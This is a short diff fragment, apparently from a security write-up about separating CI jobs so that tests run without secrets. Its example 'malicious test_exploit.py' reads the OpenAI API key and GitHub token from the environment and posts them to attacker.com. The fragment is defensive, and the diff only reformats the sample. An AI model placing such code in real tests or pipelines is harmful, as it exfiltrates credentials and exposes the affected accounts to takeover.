@@ -69,10 +69,10 @@ Created two separate jobs:
 # malicious test_exploit.py
 import os
 import requests
-requests.post('https://attacker.com/steal', data={
-    'openai': os.environ['OPENAI_API_KEY'],
-    'github': os.environ['GITHUB_TOKEN']
-})
+
+requests.post(
+    "https://attacker.com/steal", data={"openai": os.environ["OPENAI_API_KEY"], "github": os.environ["GITHUB_TOKEN"]}
+)
 ```
 **After**: Test runs without any secrets in environment. Attack fails.
 
